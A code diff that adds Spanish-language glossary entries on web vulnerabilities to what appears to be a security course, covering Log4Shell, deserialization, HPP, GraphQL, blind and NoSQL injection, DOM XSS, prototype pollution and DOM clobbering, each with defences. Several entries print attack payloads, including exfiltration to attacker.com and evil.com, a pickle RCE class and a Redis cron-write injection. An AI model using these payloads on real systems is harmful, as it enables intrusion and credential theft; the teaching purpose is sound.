+      "> ⚠️ **SAML tiene XXE** en muchos IdP históricos — un login SAML manipulado podía leer secretos del servidor.",
+    examples: [
+      "Facebook OpenID: $30K bounty por XXE en 2014.",
+      "defusedxml en Python: reemplazo seguro de lxml/xml.etree.",
+      "OWASP XXE Cheat Sheet enumera configs seguras por lenguaje.",
+    ],
+    related: ["OWASP Top 10", "SSRF y metadata cloud", "Log4Shell y JNDI injection", "IMDSv2 y SSRF a metadata"],
+  },
+  {
+    id: 256,
+    module: 22,
+    term: "Log4Shell y JNDI injection",
+    short: "Cualquier input loggeado con Log4j 2.x <2.15 evaluaba ${jndi:ldap://evil} y descargaba código Java. El CVE de la década.",
+    detail:
+      "**CVE-2021-44228** — *Log4Shell*, diciembre 2021. Score CVSS **10.0**. Cientos de millones de servidores vulnerables globalmente.\n" +
+      "\n**El bug:**\n" +
+      "Log4j 2.x tenía **lookup substitution**: `${sys:user.name}`, `${env:HOME}`. Una de las lookups era `${jndi:...}` (Java Naming and Directory Interface), que hacía **lookups remotos** vía LDAP/RMI/DNS. Sin whitelist.\n" +
+      "\n**Payload:**\n" +
+      "```\n${jndi:ldap://attacker.com/Exploit}\n```\n" +
+      "\n**Flow del ataque:**\n" +
+      "1. Atacante envía payload en cualquier campo loggeado (User-Agent, X-Forwarded-For, body, subject de email).\n" +
+      "2. El server llama `logger.info(request.getUserAgent())` → Log4j hace la sustitución.\n" +
+      "3. Log4j conecta a `ldap://attacker.com` y sigue el reference.\n" +
+      "4. LDAP responde con una URL HTTP a un `.class` malicioso.\n" +
+      "5. Java baja y ejecuta el bytecode → **RCE**.\n" +
+      "\n**Vectores creativos** (obtuvieron RCE):\n" +
+      "• User-Agent en cualquier web app Java.\n" +
+      "• Chat de Minecraft (loggeado por Log4j).\n" +
+      "• Subject de un email pasando por un scanner Java.\n" +
+      "• Field en un CSV importado por una app Java.\n" +
+      "• Search bar en Elasticsearch queries.\n" +
+      "\n**Mitigaciones (evolución de patches):**\n" +
+      "| Versión | Fix |\n" +
+      "|---|---|\n" +
+      "| 2.15.0 | JNDI habilitado solo para localhost |\n" +
+      "| 2.16.0 | Message lookups deshabilitados por default |\n" +
+      "| 2.17.0 | Fix de infinite recursion DoS |\n" +
+      "| 2.17.1 | Fix de RCE via JDBC Appender (CVE-2021-44832) |\n" +
+      "\n**Detección:**\n" +
+      "• **YARA/Sigma rules** buscando `${jndi:` en logs de acceso.\n" +
+      "• **Canary tokens**: enviar `${jndi:ldap://canarytokens.com/uuid}` a tus propios servicios y alertar si el canary se dispara.\n" +
+      "• **RASP** (Runtime Application Self-Protection) que detecta el JNDI lookup.\n" +
+      "\n**JNDI injection generalizado:**\n" +
+      "Log4Shell es un caso de **JNDI injection**. Otros vectores Java:\n" +
+      "• Deserialización con `InitialContext.lookup(user_input)`.\n" +
+      "• Spring Cloud Function `spel-injection` (CVE-2022-22963).\n" +
+      "• JMS message driven beans con `Destination` controlada.\n" +
+      "> 💡 SBOM + escaneo de dependencies transitivas (SCA) es el fix duradero — muchas orgs no sabían que tenían Log4j indirect.\n" +
+      "> ⚠️ En 2023, algunos scanners aún encontraban Log4j vulnerables en cliente-side (Elastic Beanstalk, Docker images).",
+    examples: [
+      "Log4Shell canary: crear un DNS canary y probar en tu infra por payloads recibidos.",
+      "SBOM audit: `mvn dependency:tree | grep log4j` — verificar cadena completa.",
+      "RASP tools: Contrast Security, Signal Sciences, Imperva.",
+    ],
+    related: ["OWASP Top 10", "Vulnerable and Outdated Components", "XML External Entity (XXE)", "Server-Side Template Injection (SSTI)"],
+  },
+  {
+    id: 257,
+    module: 22,
+    term: "Insecure Deserialization (Java, Python, PHP, .NET)",
+    short: "Deserializar bytes controlados por atacante = RCE. Java ObjectInputStream, Python pickle, PHP unserialize son los principales offenders.",
+    detail:
+      "La **deserialización** convierte bytes en un objeto de un lenguaje. Si el input es controlado por el atacante, puede fabricar objetos que ejecutan código al construirse o al llamarles métodos.\n" +
+      "\n**Java: ObjectInputStream**\n" +
+      "El clásico. `ObjectInputStream.readObject()` reconstruye cualquier tipo del classpath. Si hay librerías con **gadget chains** (Apache Commons Collections, Spring, Hibernate), el atacante encadena llamadas a método hasta un `Runtime.exec()`.\n" +
+      "```java\n// Vulnerable\nObjectInputStream ois = new ObjectInputStream(request.getInputStream());\nUser u = (User) ois.readObject(); // Ejecuta gadget si está en classpath\n```\n" +
+      "Herramienta: **ysoserial** genera payloads para 30+ gadget chains.\n" +
+      "\n**Python: pickle**\n" +
+      "`pickle.loads()` es explícitamente inseguro (dice la doc). El `__reduce__` de una clase se ejecuta al deserializar:\n" +
+      "```python\nimport pickle, os\nclass RCE:\n    def __reduce__(self):\n        return (os.system, ('id',))\npayload = pickle.dumps(RCE())\n# Enviar payload — al pickle.loads() se ejecuta 'id'.\n```\n" +
+      "**Uso común pero inseguro**: caching de sessions en Redis via pickle, ML models de tercero via `torch.load(untrusted)`.\n" +
+      "\n**PHP: unserialize()**\n" +
+      "`__wakeup()`, `__destruct()` en clases dispersas por el proyecto (Symfony, Laravel gadgets). El atacante manda un string `unserialize()` que reconstruye una cadena → RCE.\n" +
+      "**Phar deserialization** — file wrappers `phar://` que trigger unserialize en `file_exists()`, `md5_file()`, etc.\n" +
+      "\n**.NET: BinaryFormatter, DataContractSerializer**\n" +
+      "Similar a Java. `BinaryFormatter` desaconsejado por Microsoft en 2020, deprecated 2022. Herramientas: **ysoserial.net**.\n" +
+      "\n**Casos históricos:**\n" +
+      "• **PayPal 2016 Struts** — Java deserialization RCE.\n" +
+      "• **Jenkins 2017** — múltiples CVEs de deserialización en plugin ecosystem.\n" +
+      "• **Log4Shell** es indirectamente una deserialización (JNDI → Java gadget).\n" +
+      "• **PyTorch pickle** — modelos ML públicos con `__reduce__` malicioso.\n" +
+      "\n**Contramedidas:**\n" +
+      "• **JSON o Protobuf** en vez de serialización nativa. Nunca deserializar formato binario del usuario.\n" +
+      "• **Whitelists de clases** — Java tiene `ObjectInputFilter` (JEP 290), .NET `SerializationBinder`.\n" +
+      "• **Firma HMAC** de los blobs serializados si son inevitables (cookies, tokens).\n" +
+      "• **SafePickle / dill sandboxed** en Python — o restringir con `RestrictedUnpickler`.\n" +
+      "> 💡 **ysoserial** vs Java, **ysoserial.net** vs .NET son las biblias.\n" +
+      "> ⚠️ La lección post-2016: **nunca deserializar un formato nativo binario controlado por el atacante**. Ninguna whitelist es 100% completa.",
+    examples: [
+      "ObjectInputFilter en Java 9+: `filter=java.util.**;!*`",
+      "PyTorch: `torch.load(path, weights_only=True)` desde 2.4 evita pickle arbitrario.",
+      "Auditoría PHP: `grep -r unserialize()` — buscar sinks.",
+    ],
+    related: ["OWASP Top 10", "Log4Shell y JNDI injection", "Vulnerable and Outdated Components", "Server-Side Template Injection (SSTI)"],
+  },
+  {
+    id: 258,
+    module: 22,
+    term: "HTTP Parameter Pollution (HPP)",
+    short: "Pasar el mismo parámetro múltiples veces — cada framework lo trata distinto y WAFs/apps se desalinean.",
+    detail:
+      "El **HPP** aprovecha que diferentes componentes de la request pipeline (WAF, load balancer, framework, código app) **interpretan parámetros repetidos diferente**. Esa desalineación crea vectores.\n" +
+      "\n**Ejemplo básico:**\n" +
+      "```\nGET /api/user?id=1&id=2\n```\n" +
+      "| Sistema | Toma |\n" +
+      "|---|---|\n" +
+      "| PHP | Último (`id=2`) |\n" +
+      "| ASP.NET | Comma-separated (`id=1,2`) |\n" +
+      "| Node.js / Express | Array (`id=[1,2]`) |\n" +
+      "| Spring Java | Primer (`id=1`) |\n" +
+      "| Python Flask | Último (por default) |\n" +
+      "| Ruby on Rails | Último |\n" +
+      "\n**Vectores canónicos:**\n" +
+      "\n**1. WAF bypass**\n" +
+      "El WAF (Cloudflare, AWS WAF) inspecciona el primer parámetro y ve algo benigno. El backend Node.js toma el array `['benign', 'DROP TABLE users']` y usa el segundo:\n" +
+      "```\nGET /search?q=hello&q=' OR '1'='1\n// WAF ve 'hello' (safe) → passes\n// Backend recibe payload SQLi\n```\n" +
+      "\n**2. Auth bypass**\n" +
+      "```\nPOST /reset_password\nuser_id=victim&user_id=attacker\n// WAF valida el primer (victim, aceptable si el user está autenticado)\n// Backend usa el segundo (attacker) para el password reset\n```\n" +
+      "\n**3. HTTP Request Smuggling combinado** — HPP + CL.TE/TE.CL para hacer que el frontend vea unos parámetros y el backend otros.\n" +
+      "\n**4. Path-based HPP** — no en query string sino en el path:\n" +
+      "```\nGET /api/user/123/../456\n// El WAF normaliza `../` → ve `/api/user/456`\n// El backend NO normaliza → busca `123/../456` literal\n```\n" +
+      "\n**5. Server-Side HPP (SHPP)** — el backend construye URLs internas incorporando input del usuario:\n" +
+      "```\napp: `/internal-api?user=${user}&role=guest`\ninput user: `admin&role=admin`\nresult: `/internal-api?user=admin&role=admin&role=guest`\n// Backend interno toma primer → role=admin\n```\n" +
+      "\n**Contramedidas:**\n" +
+      "• **Normalizar antes de validar** — mismo componente decide qué parámetro se usa.\n" +
+      "• **WAF que rechaza duplicados** cuando el backend no espera arrays.\n" +
+      "• **Framework consistency** — configurar Node.js con `parameterLimit: 1` cuando no se esperan repeats.\n" +
+      "• **Whitelist estricta** de valores esperados.\n" +
+      "> 💡 **OWASP HPP Guide** enumera comportamientos por framework — invaluable en pentest.\n" +
+      "> ⚠️ HPP en headers (`X-Forwarded-For: 1.2.3.4, 5.6.7.8` vs listado como duplicados) puede bypass IP-based auth.",
+    examples: [
+      "Bypass WAF de Cloudflare con `param=safe&param=<xss>`.",
+      "Detection: canary detection en logs de duplicated params.",
+      "Herramientas: HPP Finder (Burp Extension), OWASP ZAP HPP scan.",
+    ],
+    related: ["OWASP Top 10", "SQL Injection", "Cross-Site Scripting (XSS)", "HTTP Request Smuggling (CL.TE, TE.CL, H2.CL)"],
+  },
+  {
+    id: 259,
+    module: 22,
+    term: "GraphQL security",
+    short: "Introspection abuse, batching, aliases, y ausencia de rate-limit por field convierten a GraphQL en un vector propio.",
+    detail:
+      "**GraphQL** expone un solo endpoint (`/graphql`) que acepta queries flexibles. Su flexibilidad es su superficie: sin controles, un query puede pedir todo el schema, ejecutar cientos de operaciones en un request, o BOLA a escala.\n" +
+      "\n**Vector 1: Introspection habilitada en prod**\n" +
+      "```graphql\nquery { __schema { types { name fields { name } } } }\n```\n" +
+      "Devuelve el schema completo — el atacante mapea todos los types, fields y arguments. **Deshabilitar en prod** (Apollo Server: `introspection: false`).\n" +
+      "\n**Vector 2: Query batching abuse**\n" +
+      "GraphQL permite mandar un array de queries en un solo request:\n" +
+      "```json\n[\n  { \"query\": \"mutation { login(user:\\\"a\\\", pass:\\\"1\\\") { token } }\" },\n  { \"query\": \"mutation { login(user:\\\"a\\\", pass:\\\"2\\\") { token } }\" },\n  { \"query\": \"mutation { login(user:\\\"a\\\", pass:\\\"3\\\") { token } }\" }\n  // ... 1000 más\n]\n```\nBypass de rate-limit por HTTP request. **Contramedida**: contar operaciones dentro del batch, no HTTP requests.\n" +
+      "\n**Vector 3: Alias overloading**\n" +
+      "```graphql\nquery {\n  a1: login(user:\"a\", pass:\"1\") { token }\n  a2: login(user:\"a\", pass:\"2\") { token }\n  a3: login(user:\"a\", pass:\"3\") { token }\n  // ... 1000 aliases\n}\n```\nMismo effecto que batching, pero en una sola query. Rate-limit por HTTP no ayuda.\n" +
+      "\n**Vector 4: Deep query / cyclic query DoS**\n" +
+      "```graphql\nquery {\n  users {\n    friends {\n      friends {\n        friends {\n          friends { name }\n        }\n      }\n    }\n  }\n}\n```\nExplosión combinatoria — 100 users × 100 friends × 100 friends... = crashes.\n**Contramedida**: **query complexity analysis** (bibliotecas: graphql-query-complexity, graphql-cost-analysis) — asigna costo por field y rechaza queries > umbral.\n" +
+      "\n**Vector 5: Field-level auth ausente**\n" +
+      "Un user puede ver posts públicos pero no ver el `email` del owner. Sin auth por field:\n" +
+      "```graphql\nquery { posts { title owner { email phone } } }\n```\nLeak. **Contramedida**: directivas `@auth` per-field, resolver-level middleware.\n" +
+      "\n**Vector 6: Mass Assignment via mutation**\n" +
+      "```graphql\nmutation { updateUser(input: { id: 1, role: \"admin\" }) { id role } }\n```\nSi el input type acepta `role` y el resolver no whitelistea, escalada.\n" +
+      "\n**Casos reales:**\n" +
+      "• **GitHub 2021** — batching abuse en GraphQL rate-limit bypass ($10K bounty).\n" +
+      "• **Shopify 2020** — mass assignment en GraphQL mutations.\n" +
+      "• **HackerOne 2019** — GraphQL introspection expuso endpoints internos.\n" +
+      "\n**Herramientas:**\n" +
+      "• **InQL** (Burp Extension) — auto-detecta y explora schemas.\n" +
+      "• **GraphQL Voyager** — visualiza el schema.\n" +
+      "• **CleaGraph, GraphQL Shield** — middlewares de auth.\n" +
+      "> 💡 **OWASP GraphQL Cheat Sheet** cubre defense in depth.\n" +
+      "> ⚠️ REST-first thinking mal aplicado a GraphQL: no basta con auth por endpoint; hay que autorizar por resolver / field.",
+    examples: [
+      "Query complexity limit: 100 puntos, cada nested = 10x más.",
+      "GitHub 2021 GraphQL batching bypass rate-limit: $10K bounty.",
+      "InQL Burp extension automatiza introspection + fuzzing.",
+    ],
+    related: ["OWASP Top 10", "BOLA / IDOR y Broken Object Level Auth", "HTTP Parameter Pollution (HPP)", "AAA (Autenticación, Autorización, Accounting)"],
   },
 
   // ── M23 · SQL Injection y XSS ────────────────────────────────────────────
@@ -1825,6 +2357,204 @@ export const DEFINITIONS: ConceptDefinition[] = [
     ],
     related: ["SQL Injection", "Cross-Site Scripting (XSS)", "Headers de seguridad"],
   },
+  {
+    id: 264,
+    module: 23,
+    term: "Blind SQL Injection y OOB exfiltration",
+    short: "Sin response visible, el atacante infiere datos por tiempos, bool o out-of-band vía DNS. Igual de efectiva que in-band SQLi.",
+    detail:
+      "En **SQLi in-band** el atacante ve la data en la response. En **blind SQLi** no — pero el bug sigue ahí. Se explota por **canales laterales**.\n" +
+      "\n**Tipo 1: Boolean-based blind**\n" +
+      "Compara respuestas true/false por diferencias visibles (200 vs 500, 'Welcome' vs 'Error'):\n" +
+      "```sql\n' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1) = 'a' --\n```\n" +
+      "Itera carácter por carácter. Lento pero efectivo.\n" +
+      "\n**Tipo 2: Time-based blind**\n" +
+      "Sin diferencia en response — pero el server *tarda* si la condición es true:\n" +
+      "```sql\n// MySQL\n' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --\n\n// PostgreSQL\n'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END --\n\n// SQL Server\n'; IF (SUBSTRING(password,1,1)='a') WAITFOR DELAY '0:0:5' --\n\n// Oracle\n' AND CASE WHEN (SUBSTRING(password,1,1)='a') THEN dbms_pipe.receive_message(('a'),5) ELSE null END --\n```\n" +
+      "\n**Tipo 3: Out-of-band (OOB) via DNS**\n" +
+      "El más rápido si el DB puede hacer requests salientes:\n" +
+      "```sql\n// MySQL con LOAD_FILE (requires FILE priv)\nSELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\\\a.txt'))\n\n// PostgreSQL con dblink extension\nSELECT dblink('host='||(SELECT password FROM users LIMIT 1)||'.attacker.com user=x password=y', 'SELECT 1');\n\n// SQL Server\nEXEC master..xp_dirtree '\\\\\\\\attacker.com\\\\'+password+'\\\\a.txt'\n\n// Oracle\nSELECT UTL_HTTP.REQUEST('http://'||password||'.attacker.com') FROM DUAL;\n```\n" +
+      "El DNS del atacante logea `<password>.attacker.com`. Un solo request → toda la password extraída.\n" +
+      "\n**Herramientas:**\n" +
+      "• **sqlmap** con `--technique=B` (boolean), `-T` (time), `--dns-domain=attacker.com` (OOB).\n" +
+      "• **Burp Collaborator** para OOB sin infra propia.\n" +
+      "\n**Contramedidas:**\n" +
+      "• **Prepared statements** — la única cura.\n" +
+      "• Deshabilitar funciones peligrosas (`xp_cmdshell`, `LOAD_FILE`, `dblink`) en accounts de app.\n" +
+      "• Egress firewall del DB — bloquear DNS + HTTP salientes.\n" +
+      "> 💡 En 2023 muchas apps usan ORMs que evitan concatenación — pero raw queries siguen existiendo. Auditar `db.query('...' + user_input)`.\n" +
+      "> ⚠️ Bugs de blind SQLi pasan desapercibidos en scanners que buscan reflejos.",
+    examples: [
+      "sqlmap con `--dbs --technique=T --level=5`.",
+      "Egress rule: `iptables -A OUTPUT -o eth0 -j REJECT` en DB server.",
+      "Auditoría con Burp Collaborator para OOB detection.",
+    ],
+    related: ["SQL Injection", "OWASP Top 10", "NoSQL Injection", "HTTP Parameter Pollution (HPP)"],
+  },
+  {
+    id: 265,
+    module: 23,
+    term: "NoSQL Injection",
+    short: "MongoDB, Redis, DynamoDB tienen sus propios vectores. $where en Mongo permite JS arbitrario; $ne bypass auth trivial.",
+    detail:
+      "Los NoSQL heredaron un mito: *'no hay SQL, no hay SQLi'*. Falso. Cada NoSQL tiene su sintaxis y sus vectores.\n" +
+      "\n**MongoDB — el más explotado**\n" +
+      "\n**Vector 1: Auth bypass con `$ne`**\n" +
+      "```javascript\n// Vulnerable Express + Mongo\napp.post('/login', (req, res) => {\n  db.users.findOne({ user: req.body.user, pass: req.body.pass })\n});\n\n// Payload JSON\n{ \"user\": \"admin\", \"pass\": { \"$ne\": \"\" } }\n// Query: findOne({ user: 'admin', pass: {$ne: ''} }) → matches any pass\n```\n" +
+      "\n**Vector 2: `$where` con JS arbitrario**\n" +
+      "```javascript\n{ \"$where\": \"function() { return this.password.length > 5 }\" }\n// Ejecuta JS en el server MongoDB (blind extraction)\n\n// O DoS\n{ \"$where\": \"function() { while(1); }\" }\n```\n" +
+      "\n**Vector 3: `$regex` con backtracking**\n" +
+      "```javascript\n{ \"user\": { \"$regex\": \"^admin\" } }\n// Iterar para blind extraction\n```\n" +
+      "\n**Vector 4: Operator injection**\n" +
+      "```javascript\n// Endpoint expone filter directo\nGET /api/users?filter[$gt]=\n// db.users.find({$gt: ''}) → todos los users\n```\n" +
+      "\n**Redis — command injection**\n" +
+      "Si la app pasa input al comando Redis sin escapar:\n" +
+      "```\nSET foo <user_input>\n// user_input: \"bar\\r\\nCONFIG SET dir /var/spool/cron\\r\\nCONFIG SET dbfilename root\\r\\nSAVE\"\n// Escapes → RCE por cron file writing\n```\n" +
+      "\n**DynamoDB — condition expression injection**\n" +
+      "```javascript\nParams: {\n  FilterExpression: `attribute = :val`,\n  ExpressionAttributeValues: { ':val': user_input }\n}\n// user_input: 'x OR user_id = :any' — condition bypass\n```\n" +
+      "\n**Elasticsearch — query DSL injection**\n" +
+      "```json\nGET /_search\n{ \"query\": { \"query_string\": { \"query\": \"user:${input}\" } } }\n// input: `admin OR _exists_:password`\n// Bypass filter, exfiltrate passwords via score\n```\n" +
+      "\n**Herramientas:**\n" +
+      "• **NoSQLmap** — Mongo/Couch equivalente de sqlmap.\n" +
+      "• **Burp NoSQL Scanner** — extension.\n" +
+      "\n**Contramedidas:**\n" +
+      "• **Type check el input** — si esperás string, rechazá objetos: `if (typeof pass !== 'string') reject`.\n" +
+      "• **Deshabilitar `$where`** en Mongo prod: `enableTestCommands: 0`.\n" +
+      "• **Parametrizar** al máximo — evitar template strings.\n" +
+      "• **ODM/ORMs** (Mongoose, Sequelize) — validan schema y tipo.\n" +
+      "> 💡 **MongoDB Atlas** vulnerable a `$ne` bypass en muchas apps Node.js populares (Ghost CMS, etc. en el pasado).\n" +
+      "> ⚠️ Firebase Realtime DB tiene su propio vector: rules mal escritas + client-side auth check.",
+    examples: [
+      "Mongoose schema con tipos estrictos previene `$ne` injection.",
+      "Redis: usar `redis-cli --no-raw` + escape en el driver.",
+      "NoSQLmap vs local Mongo lab para practicar detección.",
+    ],
+    related: ["SQL Injection", "OWASP Top 10", "Blind SQL Injection y OOB exfiltration", "BOLA / IDOR y Broken Object Level Auth"],
+  },
+  {
+    id: 266,
+    module: 23,
+    term: "DOM-based XSS y sinks modernos",
+    short: "innerHTML, eval, document.write, location.href, y templates JS ejecutan atacker-controlled data sin server involvement.",
+    detail:
+      "El **DOM XSS** vive **enteramente en el navegador**. El servidor no envía el payload — el JS de la página lo lee de un **source** (URL, localStorage, postMessage) y lo escribe en un **sink** peligroso. No hay logs server, no hay CSP nonce que salve si no hay Trusted Types.\n" +
+      "\n**Sources (donde el atacante controla):**\n" +
+      "| Source | Ejemplo | Riesgo |\n" +
+      "|---|---|---|\n" +
+      "| `location.hash` | `#<script>...` | XSS reflected via URL fragment |\n" +
+      "| `location.search` | `?q=<script>...` | Idem, en query |\n" +
+      "| `document.referrer` | Referer header | Attacker-controlled |\n" +
+      "| `postMessage` data | `window.postMessage(...)` | Cross-frame injection |\n" +
+      "| `localStorage/sessionStorage` | Persisted attacker data | Stored DOM XSS |\n" +
+      "| `WebSocket messages` | | Chat apps clásicos |\n" +
+      "\n**Sinks (donde ejecuta):**\n" +
+      "| Sink | Payload |\n" +
+      "|---|---|\n" +
+      "| `element.innerHTML = X` | `<img src=x onerror=alert(1)>` |\n" +
+      "| `document.write(X)` | Cualquier HTML |\n" +
+      "| `eval(X)`, `Function(X)()` | Cualquier JS |\n" +
+      "| `location = X` | `javascript:alert(1)` (auto-navega) |\n" +
+      "| `setTimeout(X, ...)` con string | JS |\n" +
+      "| `<div dangerouslySetInnerHTML={{__html: X}} />` (React) | HTML sin sanitizar |\n" +
+      "| `[innerHTML]` (Angular sin `[textContent]`) | |\n" +
+      "\n**Ejemplo canónico:**\n" +
+      "```html\n<script>\n  const q = new URLSearchParams(location.search).get('q');\n  document.getElementById('result').innerHTML = q; // SINK\n</script>\n<!-- Payload: ?q=<img src=x onerror=fetch('//evil.com/'+document.cookie)> -->\n```\n" +
+      "\n**postMessage XSS:**\n" +
+      "```javascript\nwindow.addEventListener('message', (e) => {\n  // BAD: sin verificar origin\n  document.body.innerHTML = e.data;\n});\n// Attacker sitio: window.open(target).postMessage('<script>...</script>', '*')\n```\n" +
+      "Fix: **siempre validar `e.origin`** contra whitelist.\n" +
+      "\n**jQuery `$()` con user input:**\n" +
+      "```javascript\n$('#result').html(user_input); // XSS\n// vs\n$('#result').text(user_input); // safe\n```\n" +
+      "\n**Trusted Types como defensa nativa:**\n" +
+      "```javascript\ntrustedTypes.createPolicy('sanitizer', {\n  createHTML: (str) => DOMPurify.sanitize(str)\n});\n// Ahora innerHTML = string plano LANZA TypeError; solo acepta objetos TrustedHTML\n```\n" +
+      "\n**Contramedidas:**\n" +
+      "• **Trusted Types** + policy central que sanitiza (DOMPurify).\n" +
+      "• **CSP con `require-trusted-types-for 'script'`** — el browser rechaza sinks sin type.\n" +
+      "• **Auditoría estática**: buscar sinks con Semgrep rules.\n" +
+      "• **Preferir APIs seguras**: `textContent` > `innerHTML`, `URL()` > string concat.\n" +
+      "> 💡 **PortSwigger DOM Invader** (Burp extension) fuzza sources y detecta sinks automáticamente.\n" +
+      "> ⚠️ En SPAs modernas (React/Vue/Angular) los frameworks escapan por default, PERO `dangerouslySetInnerHTML` / `v-html` / `[innerHTML]` bypassa. Grep de esos.",
+    examples: [
+      "React: `dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}}`.",
+      "Trusted Types en Gmail: bloquea DOM XSS antes de que ejecute.",
+      "DOM Invader Burp: auto-descubre sources → sinks.",
+    ],
+    related: ["Cross-Site Scripting (XSS)", "Content Security Policy (CSP) moderno", "Prototype Pollution", "DOM Clobbering"],
+  },
+  {
+    id: 267,
+    module: 23,
+    term: "Prototype Pollution",
+    short: "Contaminar Object.prototype vía __proto__ o constructor.prototype. Todos los objetos heredan el gadget → RCE via popular libs.",
+    detail:
+      "**Prototype pollution** ocurre cuando JS permite escribir en `__proto__` o `constructor.prototype` con input controlado. Toda instancia de Object hereda del prototype global — al contaminarlo, cambia el comportamiento de **toda** la app.\n" +
+      "\n**Vector clásico — merge / clone recursivo mal escrito:**\n" +
+      "```javascript\nfunction merge(target, source) {\n  for (let key in source) {\n    if (typeof source[key] === 'object') {\n      target[key] = merge(target[key] || {}, source[key]);\n    } else {\n      target[key] = source[key];\n    }\n  }\n  return target;\n}\n\n// PAYLOAD del atacante (JSON body, query params):\nmerge({}, JSON.parse(`{\"__proto__\": {\"isAdmin\": true}}`));\n\n// Todos los objetos ahora heredan isAdmin=true\nconst user = {};\nconsole.log(user.isAdmin); // true !!\n```\n" +
+      "\n**Librerías históricamente vulnerables:**\n" +
+      "• **lodash** `_.merge/_.set` (CVE-2019-10744, CVE-2020-8203).\n" +
+      "• **jQuery** `$.extend(true, ...)` (CVE-2019-11358).\n" +
+      "• **mixin-deep, set-value, defaults-deep, immer, express** en diferentes momentos.\n" +
+      "\n**Client-side vs server-side impact:**\n" +
+      "\n**Server-side (Node.js) → RCE**\n" +
+      "```javascript\n// Payload: {\"__proto__\": {\"env\": \"NODE_OPTIONS=--inspect=0.0.0.0\"}}\n// Contamina process.env vía prototype → next child_process con node debug enabled\n// O gadgets en libraries: fastify, express, Handlebars con eval en options\n```\n" +
+      "\n**Client-side (browser) → XSS**\n" +
+      "El gadget más común: **HTMLTemplateElement**:\n" +
+      "```javascript\n// Vulnerable code\nfunction render(data) {\n  const t = data.template || 'div';\n  return `<${t}>${data.content}</${t}>`;\n}\n\n// Con pollution: __proto__.template = '<img src=x onerror=alert(1)>'\n// data.template está undefined pero hereda del proto → XSS\n```\n" +
+      "\n**Detección:**\n" +
+      "```javascript\nObject.prototype.polluted = true;\nlet clean = {};\nif (clean.polluted === true) console.log('POLLUTED!');\ndelete Object.prototype.polluted;\n```\n" +
+      "En browser DevTools: `Object.prototype` — enumera keys extra.\n" +
+      "\n**Contramedidas:**\n" +
+      "• **`Object.create(null)`** en vez de `{}` — objetos sin prototype.\n" +
+      "• **`Object.freeze(Object.prototype)`** al inicio de la app.\n" +
+      "• **JSON schema validation** — rechazar keys `__proto__`, `constructor`, `prototype`.\n" +
+      "• **`--disable-proto=throw`** flag de Node.js (v14.4+).\n" +
+      "• **Uso de `Map` en vez de object literal** para diccionarios controlados.\n" +
+      "> 💡 **CVE-2019-10744 lodash** — muchos apps grandes afectados porque `_.merge` estaba en la cadena de deps.\n" +
+      "> ⚠️ Frameworks modernos (Fastify, Kysely) marcan pollution como bug crítico y hardening explícito.",
+    examples: [
+      "`Object.freeze(Object.prototype)` como primera línea del bootstrap.",
+      "Semgrep rule: `pattern-either: [merge($X, $USER_INPUT), _.set($X, $KEY, $USER_INPUT)]`.",
+      "PortSwigger academy tiene labs de client-side + server-side pollution.",
+    ],
+    related: ["OWASP Top 10", "DOM-based XSS y sinks modernos", "Cross-Site Scripting (XSS)", "DOM Clobbering"],
+  },
+  {
+    id: 268,
+    module: 23,
+    term: "DOM Clobbering",
+    short: "HTML injection sin JS ejecutable puede sobreescribir variables globales via elementos con id o name.",
+    detail:
+      "**DOM Clobbering** es un ataque **HTML-only** — sin `<script>`, sin JS ejecutable, sin bypass de CSP `script-src 'none'`. Aprovecha que HTML crea propiedades globales cuando elementos tienen `id` o `name`.\n" +
+      "\n**Comportamiento fundamental de HTML:**\n" +
+      "```html\n<img id=cookie>\n<script>console.log(window.cookie);</script>\n// window.cookie === el <img>, NO la propiedad document.cookie\n```\nCualquier `<elemento id=X>` crea `window.X`.\n" +
+      "\n**Vector 1: Sobrescribir la propiedad esperada**\n" +
+      "```javascript\n// Vulnerable code\nif (window.config) {\n  loadConfig(window.config.url);\n}\n// Atacante inyecta HTML (aún con XSS mitigada):\n<a id=config><a id=config name=url href=\"//evil.com\">\n// window.config.url === '//evil.com'\n// loadConfig('//evil.com') → CSRF, exfil, redirect\n```\n\n" +
+      "**Vector 2: form clobbering**\n" +
+      "```html\n<form id=login></form>\n<script>\n  const isAuth = login.action !== undefined;\n  // Atacante: <form id=login action=/></form>\n  // login.action = '/' → app cree que está autenticado\n</script>\n```\n\n" +
+      "**Vector 3: `document.querySelector` cache pollution**\n" +
+      "```html\n<a id=defaultAvatar name=defaultAvatar href=\"//evil.com/pic.jpg\">\n// document.defaultAvatar.href → attacker URL\n```\n\n" +
+      "**Vector 4: Bypass de `sanitize()` bibliotecas**\n" +
+      "**DOMPurify** históricamente permitió elementos como `<form>`, `<a>` con `id/name`. Aunque no ejecuta JS, clobbering pasa. DOMPurify agregó `SANITIZE_DOM` en 2020 para cubrir esto.\n" +
+      "\n**Vector 5: `import.meta` clobbering (2023 research)**\n" +
+      "Módulos ES6 tienen `import.meta.url` que a veces se usa para paths. Clobbering permite reescribirlo en algunas configs.\n" +
+      "\n**Casos reales:**\n" +
+      "• **Gareth Heyes 2020** — investigación seminal, PortSwigger blog. Bypasses de HTMLSanitizer múltiples.\n" +
+      "• **CVE-2020-26870** en dompurify — clobbering permitido.\n" +
+      "• **Google 2022** — bug bounty por DOM Clobbering en un chat product.\n" +
+      "\n**Contramedidas:**\n" +
+      "• **Verificar tipo antes de usar globals**: `if (typeof window.config === 'object' && !window.config.tagName)`.\n" +
+      "• **Sanitizer strict**: DOMPurify con `SANITIZE_DOM: true` + `FORBID_ATTR: ['id', 'name']`.\n" +
+      "• **Prefiere `let/const` locales** en vez de globals.\n" +
+      "• **CSP Trusted Types** ayuda porque forza sanitizer que rechaza esos elementos.\n" +
+      "• **Content-Security-Policy: default-src 'self'** no ayuda (no hay JS que bloquear).\n" +
+      "> 💡 **Portswigger DOM Invader** detecta clobbering automáticamente.\n" +
+      "> ⚠️ Muchos WAF y sanitizers viejos no cubren clobbering — es un vector clásico bypass de defensas XSS strict.",
+    examples: [
+      "DOMPurify: `SANITIZE_DOM: true, SANITIZE_NAMED_PROPS: true` desde 3.x.",
+      "Google Chat 2022 bug bounty por DOM clobbering.",
+      "Auditoría: `grep -r 'window\\.[a-zA-Z]' + verificar acceso sin type check`.",
+    ],
